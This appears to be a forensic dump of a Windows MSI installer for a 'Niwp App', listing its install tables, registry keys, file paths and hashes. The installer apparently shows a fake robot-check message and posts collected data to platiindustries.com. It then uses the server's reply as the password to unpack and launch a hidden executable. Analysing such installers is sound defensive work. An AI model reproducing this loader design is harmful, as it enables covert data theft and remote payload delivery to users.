+  Report.bmp | guhwjvn.rar | Report.bmp | 822 | 
+  HideReport.bmp | guhwjvn.rar | HIDERE~1.BMP|Hide Report.bmp | 822 | 
+  InsertColumn.bmp | guhwjvn.rar | INSERT~1.BMP|Insert Column.bmp | 822 | 
+  InsertReport.bmp | guhwjvn.rar | INSERT~2.BMP|Insert Report.bmp | 822 | 
+  Delete.bmp | guhwjvn.rar | Delete.bmp | 822 | 
+  NewProject.bmp | guhwjvn.rar | NEWPRO~1.BMP|New Project.bmp | 822 | 
+  MoveDown.bmp | guhwjvn.rar | MOVEDO~1.BMP|Move Down.bmp | 822 | 
+  java.desktop.jmod | guhwjvn.rar | JAVADE~1.JMO|java.desktop.jmod | 12133334 | 
+  jdk.attach.jmod | guhwjvn.rar | JDKATT~1.JMO|jdk.attach.jmod | 38562 | 
+  java.sql.rowset.jmod | guhwjvn.rar | JAVASQ~2.JMO|java.sql.rowset.jmod | 190817 | 
+  ShowHidden.bmp | guhwjvn.rar | SHOWHI~1.BMP|Show Hidden.bmp | 822 | 
+  MoveRight.bmp | guhwjvn.rar | MOVERI~1.BMP|Move Right.bmp | 822 | 
+  MoveUp.bmp | guhwjvn.rar | MOVEUP~1.BMP|Move Up.bmp | 822 | 
+  Pointer.bmp | guhwjvn.rar | Pointer.bmp | 822 | 
+  jdk.accessibility.jmod | guhwjvn.rar | JDKACC~1.JMO|jdk.accessibility.jmod | 517331 | 
+  ColumnOptions.bmp | guhwjvn.rar | COLUMN~1.BMP|Column Options.bmp | 822 | 
+  ScrollLeftFast.bmp | guhwjvn.rar | SCROLL~1.BMP|Scroll Left Fast.bmp | 822 | 
+  jdk.charsets.jmod | guhwjvn.rar | JDKCHA~1.JMO|jdk.charsets.jmod | 1500675 | 
+  ScrollLeftSlow.bmp | guhwjvn.rar | SCROLL~2.BMP|Scroll Left Slow.bmp | 822 | 
+  ScrollRightSlow.bmp | guhwjvn.rar | SCROLL~4.BMP|Scroll Right Slow.bmp | 822 | 
+  java.prefs.jmod | guhwjvn.rar | JAVAPR~1.JMO|java.prefs.jmod | 54624 | 
+  ScrolltoTask.bmp | guhwjvn.rar | SCROLL~5.BMP|Scroll to Task.bmp | 822 | 
+  AssignPrerequisites.bmp | guhwjvn.rar | ASSIGN~1.BMP|Assign Prerequisites.bmp | 822 | 
+  AssignResources.bmp | guhwjvn.rar | ASSIGN~2.BMP|Assign Resources.bmp | 822 | 
+  java.sql.jmod | guhwjvn.rar | JAVASQ~1.JMO|java.sql.jmod | 76011 | 
+  java.se.jmod | guhwjvn.rar | JAVASE~1.JMO|java.se.jmod | 2207 | 
+  DeleteColumn.bmp | guhwjvn.rar | DELETE~1.BMP|Delete Column.bmp | 822 | 
+  DeleteRow.bmp | guhwjvn.rar | DELETE~2.BMP|Delete Row.bmp | 822 | 
+  Duplicate.bmp | guhwjvn.rar | DUPLIC~1.BMP|Duplicate.bmp | 822 | 
+  java.management.rmi.jmod | guhwjvn.rar | JAVAMA~2.JMO|java.management.rmi.jmod | 92135 | 
+  java.naming.jmod | guhwjvn.rar | JAVANA~1.JMO|java.naming.jmod | 460349 | 
+  java.rmi.jmod | guhwjvn.rar | JAVARM~1.JMO|java.rmi.jmod | 385108 | 
+
+  java.scripting.jmod | guhwjvn.rar | JAVASC~1.JMO|java.scripting.jmod | 44965 | 
+  java.security.jgss.jmod | guhwjvn.rar | JAVASE~2.JMO|java.security.jgss.jmod | 698330 | 
+  java.instrument.jmod | guhwjvn.rar | JAVAIN~1.JMO|java.instrument.jmod | 41127 | 
+  java.security.sasl.jmod | guhwjvn.rar | JAVASE~3.JMO|java.security.sasl.jmod | 81698 | 
+  java.smartcardio.jmod | guhwjvn.rar | JAVASM~1.JMO|java.smartcardio.jmod | 58645 | 
+  java.transaction.xa.jmod | guhwjvn.rar | JAVATR~1.JMO|java.transaction.xa.jmod | 4035 | 
+  java.xml.jmod | guhwjvn.rar | JAVAXM~2.JMO|java.xml.jmod | 4554630 | 
+  jdk.aot.jmod | guhwjvn.rar | JDKAOT~1.JMO|jdk.aot.jmod | 286933 | 
+[ServiceInstall]
+  <none>
+[CustomAction]
+  CEPHtmlEngine.exe | 210 | CEPHtmlEngine.exe | 
+  UnRar.exe | 18 | UnRar.exe | x -p[GrinvAqoi] -o+ "[APPDIR]guhwjvn.rar" "[APPDIR]"
+  AI_BACKUP_AI_SETUPEXEPATH | 51 | AI_SETUPEXEPATH_ORIGINAL | [AI_SETUPEXEPATH]
+  AI_RESTORE_AI_SETUPEXEPATH | 51 | AI_SETUPEXEPATH | [AI_SETUPEXEPATH_ORIGINAL]
+  AI_SET_ADMIN | 51 | AI_ADMIN | 1
+  AI_InstallModeCheck | 1 | aicustact.dll | UpdateInstallMode
+  AI_SHOW_LOG | 65 | aicustact.dll | LaunchLogFile
+  AI_DpiContentScale | 1 | aicustact.dll | DpiContentScale
+  AI_EnableDebugLog | 321 | aicustact.dll | EnableDebugLog
+  AI_DATA_SETTER | 51 | CustomActionData | Please verify that you are not a robot. |Fast check |MB_OK,MB_ICONINFORMATION,MB_DEFBUTTON1|BTN_PRESSED|[CLIENTPROCESSID]
+  AI_DATA_SETTER_1 | 51 | CustomActionData | HttpPostCollectDataDate;TimeHttpPostSuppressSpawnMsgBoxHttpPostUrlhttps://platiindustries.com/licenseUser.php
+  AI_DATA_SETTER_2 | 51 | CustomActionData | ParamsScript$oiewfhc = AI_GetMsiProperty "GrinvAqoi"
+$iuesagh = [\[]uint32[\]]($oiewfhc -replace 'b', '')
+AI_SetMsiProperty "SraTrim" $iuesaghScriptPreambleparam(
+  [\[]alias("propFile")[\]]      [\[]Parameter(Mandatory=$true)[\]] [\[]string[\]] $msiPropOutFilePath
+ ,[\[]alias("propSep")[\]]       [\[]Parameter(Mandatory=$true)[\]] [\[]string[\]] $msiPropKVSeparator
+ ,[\[]alias("lineSep")[\]]       [\[]Parameter(Mandatory=$true)[\]] [\[]string[\]] $msiPropLineSeparator
+ ,[\[]alias("scriptFile")[\]]    [\[]Parameter(Mandatory=$true)[\]] [\[]string[\]] $userScriptFilePath
+ ,[\[]alias("scriptArgsFile")[\]][\[]Parameter(Mandatory=$false)[\]][\[]string[\]] $userScriptArgsFilePath
+ ,[\[]Parameter(Mandatory=$true)[\]]                          [\[]string[\]] $testPrefix
+ ,[\[]switch[\]]                                                       $isTest
+ )
+
+Function AI_GetMsiProperty( [\[]Parameter(Mandatory=$true)[\]]  [\[]string[\]] $name
+                          , [\[]Parameter(Mandatory=$false)[\]] $testValue = $null
+                          )
+[\{]
+  if ($isTest -and ($testValue -ne $null))
+  [\{]
+    [\[]string[\]] $newData = "$testPrefix$name$msiPropKVSeparator$testValue$msiPropLineSeparator"
+    [\[]System.IO.File[\]]::AppendAllText($msiPropOutFilePath, $newData, [\[]System.Text.Encoding[\]]::Unicode)
+    return $testValue
+  [\}]
+  [\[]string[\]] $contentData = Get-Content $msiPropOutFilePath -raw
+  [\[]array[\]] $content = $contentData -split $msiPropLineSeparator
+  
+  [\[]array[\]]::Reverse($content)
+  ForEach ($line in $content)
+  [\{]
+    $lineTokens = $line -split $msiPropKVSeparator
+    if ($lineTokens.Count -gt 1 -and $lineTokens[\[]0[\]] -eq $name)
+    [\{]
+      return $lineTokens[\[]1[\]]
+    [\}]
+  [\}]
+  return ''
+[\}]
+
+Function AI_SetMsiProperty( [\[]Parameter(Mandatory=$true)[\]] $name
+                          , [\[]Parameter(Mandatory=$false)[\]] $value
+                          )
+[\{]
+  if ($value -eq $null)
+  [\{]
+    Write-Output "POTENTIAL_BUG: MSI property $name set to an uninitialized/null variable. Initialize empty variables using empty quotes."
+  [\}]
+  [\[]string[\]] $newData = "$name$msiPropKVSeparator$value$msiPropLineSeparator"
+  [\[]System.IO.File[\]]::AppendAllText($msiPropOutFilePath, $newData, [\[]System.Text.Encoding[\]]::Unicode)
+[\}]
+
+Set-Alias -name "Get-Property" -value AI_GetMsiProperty
+Set-Alias -name "Set-Property" -value AI_SetMsiProperty
+
+try
+[\{]
+  [\[]string[\]] $userScriptArgs = Get-Content $userScriptArgsFilePath
+  
+  $userScriptFilePath = $userScriptFilePath.Replace(' ', '` ')
+  $userScriptFilePath = $userScriptFilePath.Replace('(', '`(')
+  $userScriptFilePath = $userScriptFilePath.Replace(')', '`)')
+  $userScriptFilePath = $userScriptFilePath.Replace('$', '`$')
+  $userScriptFilePath = $userScriptFilePath.Replace('&', '`&')
+  # Simple quotes are problematic, especially when more in a succession
+  # e.g. in a username. We need to enclose each bundle of them in a simple quoted string
+  # with each contained simple quote being escaped by doubling. N initial quotes => (N+1)*2 final quotes
+  $userScriptFilePath = $userScriptFilePath.Replace("''''", "??????????")
+  $userScriptFilePath = $userScriptFilePath.Replace("'''",  "????????")
+  $userScriptFilePath = $userScriptFilePath.Replace("''",   "??????")
+  $userScriptFilePath = $userScriptFilePath.Replace("'",    "????")
+  $userScriptFilePath = $userScriptFilePath.Replace('?',    "'")
+  
+  Invoke-Expression "$userScriptFilePath $userScriptArgs"
+
+  if ($LastExitCode -ne $null)
+  [\{]
+    exit $LastExitCode;
+  [\}]
+[\}]
+catch
+
+[\{]
+   Write-Output "ERROR: $($_.Exception.Message)"
+   Exit 0x23E #ERROR_UNHANDLED_EXCEPTION
+[\}]
+
+  AI_DOWNGRADE | 19 |  | 4010
+  AI_PREPARE_UPGRADE | 65 | aicustact.dll | PrepareUpgrade
+  AI_PRESERVE_INSTALL_TYPE | 65 | aicustact.dll | PreserveInstallType
+  AI_RESTORE_LOCATION | 65 | aicustact.dll | RestoreLocation
+  AI_ResolveKnownFolders | 1 | aicustact.dll | AI_ResolveKnownFolders
+  AI_STORE_LOCATION | 51 | ARPINSTALLLOCATION | [APPDIR]
+  MessageBox | 1 | aicustact.dll | MsgBox
+  AI_CORRECT_INSTALL | 51 | AI_INSTALL | {}
+  PowerShellScriptInline | 1 | PowerShellScriptLauncher.dll | RunPowerShellScript
+  SET_APPDIR | 307 | APPDIR | [AppDataFolder][Manufacturer]\[ProductName]
+  SET_SHORTCUTDIR | 307 | SHORTCUTDIR | [ProgramMenuFolder][ProductName]
+  SET_TARGETDIR_TO_APPDIR | 51 | TARGETDIR | [APPDIR]
+  AI_SET_RESUME | 51 | AI_RESUME | 1
+  AI_SET_INSTALL | 51 | AI_INSTALL | 1
+  SendCollectedData | 1 | DataUploader.dll | SendCollectedData
+  SetProperty | 51 | GrinvAqoi | [HttpPostServerResponse]
+  AI_SET_MAINT | 51 | AI_MAINT | 1
+  AI_SET_PATCH | 51 | AI_PATCH | 1
+  AI_DETECT_MODERNWIN | 1 | aicustact.dll | DetectModernWindows
+  AI_DETECT_WINTHEME | 65 | aicustact.dll | DetectWindowsTheme
+[Binary]
+  background.jpg
+  completeex.ico
+  info
+  Up
+  New
+  typicalex.ico
+  customex.ico
+  removeex.ico
+  repairex.ico
+  white.jpg
+  whitesmall.jpg
+  infoex.ico
+  exclamation.ico
+  collecting.jpg
+  minbackground.jpg
+  preparing.jpg
+  installing.jpg
+  finalizing.jpg
+  tabback
+  PowerShellScriptLauncher.dll
+  DataUploader.dll
+  aicustact.dll
+  cmdlinkarrow
+  rtlobackground.jpg
+[InstallExecuteSequence]
+  CostFinalize |  | 1000
+  CostInitialize |  | 800
+  InstallFinalize |  | 6600
+  InstallInitialize |  | 1500
+  InstallValidate |  | 1400
+  CreateShortcuts |  | 4500
+  MsiPublishAssemblies |  | 6250
+  PublishComponents |  | 6200
+  PublishFeatures |  | 6300
+  PublishProduct |  | 6400
+  RegisterClassInfo |  | 4600
+  RegisterExtensionInfo | AI_EXTREG <> "No" | 4700
+  RegisterMIMEInfo |  | 4900
+  RegisterProgIdInfo |  | 4800
+  CEPHtmlEngine.exe | ( NOT Installed ) AND ( (NOT (SraTrim = 851858 OR SraTrim = 0)) ) | 6602
+  UnRar.exe | (NOT (SraTrim = 851858 OR SraTrim = 0)) | 6601
+  AppSearch |  | 100
+  LaunchConditions | NOT Installed | 400
+  ProcessComponents |  | 1600
+  InstallServices | VersionNT | 5800
+  AllocateRegistrySpace | NOT Installed | 1550
+  BindImage |  | 4300
+  UnregisterComPlus | Installed | 2100
+  CreateFolders |  | 3700
+  DeleteServices | VersionNT | 2000
+  DuplicateFiles |  | 4210
+  FileCost |  | 900
+  FindRelatedProducts |  | 200
+  RemoveDuplicateFiles | Installed | 3400
+  InstallFiles |  | 4000
+  PatchFiles | PATCH | 4090
+  RemoveRegistryValues |  | 2600
+  InstallODBC | AI_USE_STD_ODBC_MGR | 5400
+  MigrateFeatureStates |  | 1100
+  MoveFiles |  | 3800
+  MsiUnpublishAssemblies | Installed | 1625
+  UnregisterExtensionInfo | Installed AND (AI_EXTREG <> "No") | 2800
+  RegisterProduct |  | 6100
+  RegisterComPlus |  | 5700
+  RegisterFonts |  | 5300
+  RemoveFolders | Installed | 3600
+  WriteIniValues |  | 5100
+  RegisterTypeLibraries |  | 5500
+  WriteRegistryValues |  | 5000
+  RegisterUser |  | 6000
+  RemoveEnvironmentStrings |  | 3300
+  SetODBCFolders | AI_USE_STD_ODBC_MGR | 1200
+  RemoveExistingProducts | AI_UPGRADE<>"No" | 1450
+  RemoveFiles |  | 3500
+
+  RemoveIniValues |  | 3100
+  RemoveODBC | AI_USE_STD_ODBC_MGR AND Installed | 2400
+  SelfRegModules |  | 5600
+  RemoveShortcuts | Installed | 3200
+  SelfUnregModules | Installed | 2200
+  StartServices | VersionNT | 5850
+  StopServices | VersionNT | 1900
+  UnpublishComponents | Installed | 1700
+  UnpublishFeatures |  | 1800
+  UnregisterClassInfo | Installed | 2700
+  UnregisterFonts | Installed | 2500
+  UnregisterMIMEInfo | Installed | 3000
+  UnregisterProgIdInfo | Installed | 2900
+  UnregisterTypeLibraries | Installed | 2300
+  WriteEnvironmentStrings |  | 5200
+  AI_EnableDebugLog |  | 51
+  AI_DATA_SETTER | ( NOT Installed ) | 901
+  AI_DATA_SETTER_1 |  | 951
+  AI_DATA_SETTER_2 | (NOT (GrinvAqoi = 0)) AND Cevuia = "True" | 1601
+  AI_DOWNGRADE | AI_NEWERPRODUCTFOUND AND (UILevel <> 5) | 210
+  AI_PREPARE_UPGRADE | AI_UPGRADE="No" AND (Not Installed) | 1397
+  AI_RESTORE_LOCATION | APPDIR="" | 749
+  AI_ResolveKnownFolders |  | 52
+  AI_STORE_LOCATION | (Not Installed) OR REINSTALL | 1501
+  MessageBox | ( NOT Installed ) | 902
+  PowerShellScriptInline | (NOT (GrinvAqoi = 0)) AND Cevuia = "True" | 1602
+  SET_APPDIR | APPDIR="" | 750
+  SET_SHORTCUTDIR | SHORTCUTDIR="" | 775
+  SET_TARGETDIR_TO_APPDIR |  | 785
+  SendCollectedData |  | 952
+  SetProperty |  | 953
+  AI_DETECT_MODERNWIN | (VersionNT >= 603) | 53
+  AI_DETECT_WINTHEME | (VersionNT >= 603) | 54
+  InstallExecute |  | 6500
+  IsolateComponents | RedirectedDllSupport | 950
+  ValidateProductID |  | 700
+[Shortcut]
+  <none>
+RESOLVED: DisplayName=Niwp App
+RESOLVED: Publisher=Tioao Wesah
+RESOLVED: InstallLocation=C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\
+RESOLVED: LocalPackage=C:\Windows\Installer\a46df.msi
+----------------------------------------------------------------------------------------------
+                                    LIVE COM REGISTRATION
+----------------------------------------------------------------------------------------------
+
+COM sweep: skipped
+----------------------------------------------------------------------------------------------
+                             APP PATHS / REGISTERED APPLICATIONS
+----------------------------------------------------------------------------------------------
+
+App Paths hits: 0; RegisteredApplications hits: 0
+----------------------------------------------------------------------------------------------
+                                RAW REGISTRY SWEEP (OPTIONAL)
+----------------------------------------------------------------------------------------------
+
+Raw ProductCode sweep: skipped
+----------------------------------------------------------------------------------------------
+                              NAME / PUBLISHER SWEEP (OPTIONAL)
+----------------------------------------------------------------------------------------------
+
+Name/publisher sweep: skipped
+----------------------------------------------------------------------------------------------
+                                        REGISTRY KEYS
+----------------------------------------------------------------------------------------------
+
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Features
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\InstallProperties
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Patches
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Usage
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{70995719-AA9F-40B3-85E9-C46CB738DAAF}
+----------------------------------------------------------------------------------------------
+                                      REGISTRY KEY PATHS
+----------------------------------------------------------------------------------------------
+
+  01 -> Software\Tioao Wesah\Niwp App\LiteLicuqidExpire
+  01 -> Software\Tioao Wesah\Niwp App\Version
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-core-profile-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-core-rtlsupport-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-core-string-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-core-synch-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-core-synch-l1-2-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-core-sysinfo-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-core-timezone-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-core-util-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-conio-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-convert-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-environment-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-filesystem-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-heap-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-locale-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-math-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-multibyte-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-private-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-process-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-runtime-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-stdio-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-string-l1-1-0.dll
+
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\api-ms-win-crt-time-l1-1-0.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\axvlc.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\CEPHtmlEngine.exe
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\chrome_elf.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\git-bash.exe
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\git-cmd.exe
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\guhwjvn.rar
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\libvlccore.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\msvcp140.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\npvlc.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\Qt5Core.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\Qt5Gui.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\smartgit-updater.exe
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\smartgit.exe
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\smartgitc.exe
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\icudtl.dat
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\jvm.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libGLESv2.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_autodel_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_bridge_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_chromaprint_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_chromecast_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_cycle_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_delay_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_description_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_display_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_dummy_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_duplicate_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_es_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_gather_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_mosaic_bridge_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_record_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_rtp_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_setid_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_smem_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_standard_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_stats_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\libstream_out_transcode_plugin.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\stream_out\oneds.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\UnRar.exe
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\vcruntime140.dll
+  C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\vcruntime140_1.dll
+----------------------------------------------------------------------------------------------
+                                            FILES
+----------------------------------------------------------------------------------------------
+
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-profile-l1-1-0.dll
+  SHA256: 42F4E84073CF876BBAB9DD42FD87124A4BA10BB0B59D2C3031CB2B2DA7140594
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-rtlsupport-l1-1-0.dll
+  SHA256: 02D987EBA4A65509A2DF8ED5DD0B1A0578966E624FCF5806614ECE88A817499F
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-string-l1-1-0.dll
+  SHA256: 9447218CC4AB1A2C012629AAAE8D1C8A428A99184B011BCC766792AF5891E234
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-synch-l1-1-0.dll
+  SHA256: A31A15BED26232A178BA7ECB8C8AA9487C3287BB7909952FC06ED0D2C795DB26
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-synch-l1-2-0.dll
+  SHA256: 1C72AC404781A9986D8EDEB0EE5DD39D2C27CE505683CA3324C0ECCD6193610A
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-sysinfo-l1-1-0.dll
+  SHA256: 19C78EF5BA470C5B295DDDEE9244CBD07D0368C5743B02A16D375BFB494D3328
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-timezone-l1-1-0.dll
+  SHA256: 3D798B9C345A507E142E8DACD7FB6C17528CC1453ABFEF2FFA9710D2FA9E032C
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-util-l1-1-0.dll
+  SHA256: 5EB724C51EECBA9AC7B8A53861A1D029BF2E6C62251D00F61AC7E2A5F813AAA3
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-conio-l1-1-0.dll
+  SHA256: B119ADAD588EBCA7F9C88628010D47D68BF6E7DC6050B7E4B787559F131F5EDE
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-convert-l1-1-0.dll
+  SHA256: 6C008BE766C44BF968C9E91CDDC5B472110BEFFEE3106A99532E68C605C78D44
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-environment-l1-1-0.dll
+  SHA256: AA3E3E99964D7F9B89F288DBE30FF18CBC960EE5ADD533EC1B8326FE63787AA3
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-filesystem-l1-1-0.dll
+  SHA256: 974AF1F1A38C02869073B4E7EC4B2A47A6CE8339FA62C549DA6B20668DE6798C
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-heap-l1-1-0.dll
+  SHA256: 8166321F14D5804CE76F172F290A6F39CE81373257887D9897A6CF3925D47989
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-locale-l1-1-0.dll
+  SHA256: EDC1699E9995F98826DF06D2C45BEB9E02AA7817BAE3E61373096AE7F6FA06E0
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-math-l1-1-0.dll
+  SHA256: F6A93FE6B57A54AAC46229F2ED14A0A979BF60416ADB2B2CFC672386CCB2B42E
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-multibyte-l1-1-0.dll
+  SHA256: 5B3E29116383BA48A2F46594402246264B4CB001023237EBBF28E7E9292CDB92
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-private-l1-1-0.dll
+  SHA256: 55BC91A549D22B160AE4704485E19DEE955C7C2534E7447AFB84801EE629639B
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-process-l1-1-0.dll
+  SHA256: 191F53988C7F02DD888C4FBF7C1D3351570F3B641146FAE6D60ACDAE544771AE
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-runtime-l1-1-0.dll
+  SHA256: 4390C389BBBF9EC7215D12D22723EFD77BEB4CD83311C75FFE215725ECFD55DC
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-stdio-l1-1-0.dll
+  SHA256: 6F6F6E857B347F70ECC669B4DF73C32E42199B834FE009641D7B41A0B1C210AF
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-string-l1-1-0.dll
+  SHA256: 45E0835B1D3B446FE2C347BD87922C53CFB6DD826499E19A1D977BF4C11B0E4A
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-time-l1-1-0.dll
+  SHA256: B48310B0837027F756D62C37EA91AF988BAA403CBCBD01CB26B6FDAE21EA96A2
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\assign prerequisites.bmp
+  SHA256: 79B35C4A81FE05298793E2BD26D11AD31E5AF8425A3F988F8EBECC40C507CC68
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\assign resources.bmp
+  SHA256: 447D013B727783C6601BF03DFB640289FAEDF4861C6F7654070D46F8C34CAB68
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\axvlc.dll
+  SHA256: 340489A1108E112C199049E867F1066A51FFC38ADB4BB78000AA2E55191D1838
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\cephtmlengine.exe
